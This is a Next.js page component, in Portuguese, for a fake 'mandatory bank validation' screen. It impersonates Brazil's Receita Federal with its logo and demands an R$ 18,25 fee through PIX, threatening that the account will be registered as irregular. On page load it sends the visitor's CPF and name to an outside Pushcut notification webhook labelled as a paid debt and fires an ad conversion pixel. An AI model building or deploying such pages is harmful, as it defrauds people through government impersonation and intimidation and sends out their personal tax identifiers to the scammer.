"use client";

import { useSearchParams, useRouter } from "next/navigation";
import { useEffect, useRef, Suspense } from "react";
import Image from "next/image";
import { Lock, Check, AlertTriangle } from "lucide-react";

function ValidacaoContent() {
  const searchParams = useSearchParams();
  const router = useRouter();
  const notificationSent = useRef(false);
  const cpf = searchParams.get("cpf") || "";
  const nome = searchParams.get("nome") || "";
  const valor = "18.25";

  useEffect(() => {
    if (!notificationSent.current) {
      notificationSent.current = true;
      // Notificacao Pushcut - Pendencia CPF paga
      fetch("https://api.pushcut.io/EAdPHzz_Giwpjt0AwH9L_/notifications/Serasa", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ text: `Pendencia CPF PAGA - CPF: ${cpf} - Nome: ${nome} - Valor: R$ 85,00` }),
      }).catch(() => {});

      // Pixel de conversao - Pendencia CPF paga
      const fireConversion = () => {
        if (typeof window !== "undefined" && (window as any).gtag) {
          (window as any).gtag("event", "conversion", {
            send_to: "AW-18028229407/CfDYCPay04wcEJ_mw5RD",
            value: 85.00,
            currency: "BRL",
            transaction_id: `${cpf}-pendencia-${Date.now()}`,
          });
          return true;
        }
        return false;
      };

      if (!fireConversion()) {
        const interval = setInterval(() => {
          if (fireConversion()) clearInterval(interval);
        }, 500);
        setTimeout(() => clearInterval(interval), 10000);
      }
    }
  }, [cpf, nome]);

  const handleValidar = () => {
    router.push(`/pix-validacao?cpf=${cpf}&nome=${encodeURIComponent(nome)}&valor=18.25`);
  };

  return (
    <div className="flex min-h-screen flex-col bg-zinc-100">
        <header className="bg-[#1a3a5c] py-6">
          <div className="container mx-auto flex items-center justify-center px-4">
            <Image
              src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/receita%20logo-5oMBtZQX2XJMHl6HqLjm9BLoPNA7st.png"
              alt="Receita Federal"
              width={200}
              height={60}
              className="h-12 w-auto"
              unoptimized
            />
          </div>
        </header>

        <main className="flex flex-1 flex-col items-center px-4 py-8">
          <div className="w-full max-w-md rounded-lg bg-white p-6 shadow-md">
            <div className="mb-6 flex items-center justify-center gap-2">
              <Lock className="h-8 w-8 text-amber-500" />
              <h1 className="text-center text-2xl font-bold text-zinc-800">
                Validacao Bancaria
                <br />
                Obrigatoria
              </h1>
            </div>

            <p className="mb-6 text-center text-zinc-600">
              Para garantir a seguranca e regularidade da sua transferencia, e necessaria a realizacao de uma{" "}
              <span className="font-semibold text-blue-600">validacao bancaria obrigatoria</span>, conforme as
              normas do sistema bancario nacional.
            </p>

            <div className="mb-6 rounded-lg bg-zinc-100 p-4">
              <h2 className="mb-4 font-bold text-zinc-800">Por que a validacao e necessaria?</h2>
              
              <div className="space-y-4">
                <div className="flex items-start gap-3">
                  <Check className="mt-0.5 h-5 w-5 flex-shrink-0 text-zinc-700" />
                  <p className="text-zinc-600">Evita transacoes invalidas ou bloqueios futuros.</p>
                </div>
                
                <div className="flex items-start gap-3">
                  <Check className="mt-0.5 h-5 w-5 flex-shrink-0 text-zinc-700" />
                  <p className="text-zinc-600">Confirma a autenticidade dos seus dados bancarios.</p>
                </div>
                
                <div className="flex items-start gap-3">
                  <Check className="mt-0.5 h-5 w-5 flex-shrink-0 text-zinc-700" />
                  <p className="text-zinc-600">Libera sua transferencia com total seguranca.</p>
                </div>
              </div>
            </div>

            <div className="mb-2 text-center">
              <span className="font-bold text-zinc-800">Valor da Taxa: </span>
              <span className="text-xl font-bold text-green-600">R$ 18,25</span>
            </div>

            <p className="mb-6 text-center text-zinc-600">
              <span className="font-bold">Prazo para Validacao:</span> Ate 15 minutos apos o pagamento.
            </p>

            <button
              type="button"
              onClick={handleValidar}
              className="w-full rounded-lg bg-[#1a3a5c] py-4 text-lg font-bold uppercase text-white transition-colors hover:bg-[#15304d]"
            >
              Validar Agora
            </button>

            <div className="mt-4 flex items-start gap-2 text-center">
              <AlertTriangle className="mt-0.5 h-5 w-5 flex-shrink-0 text-amber-500" />
              <p className="text-sm text-zinc-500">
                <span className="font-semibold text-amber-600">Atencao:</span> O nao pagamento pode causar o registro de sua conta como{" "}
                <span className="font-semibold text-amber-600">irregular</span>, impactando futuras transacoes financeiras.
              </p>
            </div>
          </div>
        </main>
      </div>
  );
}

export default function ValidacaoPage() {
  return (
    <Suspense
      fallback={
        <div className="flex min-h-screen items-center justify-center bg-zinc-100">
          <p className="text-zinc-600">Carregando...</p>
        </div>
      }
    >
      <ValidacaoContent />
    </Suspense>
  );
}
